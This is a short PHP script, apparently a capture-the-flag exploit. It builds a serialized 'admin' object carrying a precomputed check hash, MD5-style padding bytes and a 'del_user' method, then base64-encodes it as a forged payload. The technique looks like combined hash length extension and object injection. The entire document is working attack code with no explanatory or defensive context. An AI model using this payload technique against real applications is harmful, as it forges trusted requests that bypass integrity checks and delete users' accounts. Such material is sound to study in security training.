<?php

class admin{
	function __construct($serid){
		$this->userid = $serid;
	}
    var $name = "admin";
    var $check= "4af6ae895d65fe450ff1e9531e0579d2";
    var $data = "\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00";
    var $method="del_user";   
    var $userid=""; 
}
$serid = $argv[1]; 
$a = new admin($serid);
$api = base64_encode(serialize($a));
print_r($api);